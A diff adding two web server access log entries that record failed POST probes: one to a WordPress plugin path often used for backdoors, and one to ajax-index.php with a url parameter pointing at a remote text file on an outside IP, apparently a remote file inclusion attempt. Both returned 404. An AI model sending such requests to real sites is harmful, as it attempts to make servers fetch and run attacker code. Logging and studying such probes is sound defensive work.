@@ -1,0 +1,2 @@
+-	01:21:55	-0500	POST /wp-content/plugins/plugins.php HTTP/1.1	404	23407	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
+-	17:55:06	-0500	POST /ajax-index.php?url=http://193.201.9.12/b.txt HTTP/1.1	404	23407	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
